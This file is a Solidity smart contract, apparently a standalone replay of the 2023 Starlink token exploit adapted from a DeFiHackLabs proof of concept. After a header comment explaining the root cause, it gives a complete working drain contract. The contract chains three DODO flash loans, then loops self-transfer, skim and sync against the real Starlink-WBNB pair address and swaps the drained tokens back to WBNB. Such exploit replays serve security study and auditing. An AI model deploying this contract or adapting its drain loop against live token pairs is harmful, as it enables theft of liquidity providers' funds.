// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-Starlink).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` harness (`attacker = address(this)`; the DODO DPP
// flash-loan callback `DPPFlashLoanCall` lives on the test itself) -- there
// is no standalone exploit contract to deploy. This is a faithful,
// self-contained copy of that inline attack (testExploit -> run(),
// DPPFlashLoanCall unchanged, WBNBToStarlink/StarlinkToWBNB unchanged, no
// imports so it compiles anywhere). Logic and constants are copied verbatim
// from test/Starlink_exp.sol in the registry.
//
// Why THREE chained flash loans (not one): each individual DODO DPP pool
// (dodo1/dodo2/dodo3) only holds a partial slice of the total WBNB needed to
// size a swap large enough to meaningfully skew the Starlink/WBNB pair. The
// attack borrows from dodo1, and from INSIDE that callback immediately
// borrows from dodo2 (nesting a second flash loan before repaying the
// first), and from INSIDE *that* callback borrows from dodo3 -- so by the
// time the innermost (dodo3) callback fires, the contract holds the SUM of
// all three pools' WBNB balances in one shot. Only then does it swap into
// Starlink and run the drain loop. Repayment then unwinds outward: dodo3 is
// repaid at the end of the dodo3 branch, dodo2 is repaid at the end of the
// dodo2 branch (after the dodo3 call returns), dodo1 is repaid at the end of
// the dodo1 branch (after the dodo2 call returns). All three loans share the
// SAME callback signature `DPPFlashLoanCall`, so the callback distinguishes
// which loan is currently active purely by `msg.sender` (dodo1 vs dodo2 vs
// dodo3) -- no extra state variable is needed since DODO passes the calling
// pool as `msg.sender`, not as a callback argument.
//
// Root cause: Starlink is a reflect-style/fee-on-transfer token. Once a
// large chunk of Starlink sits in the Starlink-WBNB pair (pushed there by
// the initial lopsided `Pair.swap()`, sized off `Router.getAmountsOut` --
// which reads the pair's CACHED reserves, not its real post-manipulation
// balance), the attacker can repeatedly self-transfer the pair's own
// Starlink balance back to itself (a self-transfer that the reflect
// mechanics turn into free extra balance / does not net to zero) and then
// call `Pair.skim(attacker)`, which pays out any balance in excess of the
// pair's cached reserves directly to the caller with NO price check and NO
// K-invariant enforcement. Looping this drains the pair's real Starlink
// balance far below what its cached reserves imply, and the final
// `StarlinkToWBNB` swap converts the drained Starlink back into WBNB at a
// favorable rate, netting a profit large enough to repay all three nested
// DODO flash loans plus their (zero-fee, `flashLoanFee = 0`) principal and
// keep the rest.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface Uni_Router_V2 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Uni_Pair_V2 {
    function balanceOf(address owner) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract StarlinkDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);

    address constant dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address constant dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address constant dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    uint256 dodoFlashAmount1;
    uint256 dodoFlashAmount2;
    uint256 dodoFlashAmount3;

    // step 0: kick off the outermost flash loan from dodo1. Everything else
    // (dodo2, dodo3, the drain, and all three repayments) happens inside the
    // nested DPPFlashLoanCall callbacks below.
    function run() external {
        dodoFlashAmount1 = WBNB.balanceOf(dodo1);
        DVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));
    }

    // Shared DODO DPP flash-loan callback. DODO invokes this on the
    // borrower (this contract) as `msg.sender == <the pool that lent>`, so
    // the SAME function signature is reused for all three nested loans --
    // the branch below is selected purely by which pool is calling back.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            // Immediately nest a second flash loan from dodo2 BEFORE
            // repaying dodo1 -- accumulates dodo2's WBNB on top of dodo1's.
            dodoFlashAmount2 = WBNB.balanceOf(dodo2);
            DVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));
            WBNB.transfer(dodo1, dodoFlashAmount1);
        } else if (msg.sender == dodo2) {
            // Nest a third flash loan from dodo3 BEFORE repaying dodo2 --
            // now holds dodo1 + dodo2 + dodo3's WBNB simultaneously.
            dodoFlashAmount3 = WBNB.balanceOf(dodo3);
            DVM(dodo3).flashLoan(dodoFlashAmount3, 0, address(this), new bytes(1));
            WBNB.transfer(dodo2, dodoFlashAmount2);
        } else if (msg.sender == dodo3) {
            // Innermost callback: the FULL combined WBNB war chest is now
            // available. Dump it into Starlink, drain the pair via the
            // self-transfer + skim loop, swap back to WBNB, then repay dodo3.
            WBNBToStarlink();
            while (Starlink.balanceOf(address(Pair)) > 1000) {
                Starlink.transfer(address(Pair), Starlink.balanceOf(address(Pair)));
                Pair.skim(address(this));
                Pair.sync();
            }
            StarlinkToWBNB();
            WBNB.transfer(dodo3, dodoFlashAmount3);
        }
    }

    function WBNBToStarlink() internal {
        uint256 amountIn = WBNB.balanceOf(address(this));
        WBNB.transfer(address(Pair), WBNB.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Starlink);
        uint256[] memory values = Router.getAmountsOut(amountIn, path);
        values[1] = Starlink.balanceOf(address(Pair)) * 51 / 100;
        Pair.swap(values[1], 0, address(this), "");
    }

    function StarlinkToWBNB() internal {
        Starlink.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(Starlink);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Starlink.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp
        );
    }
}
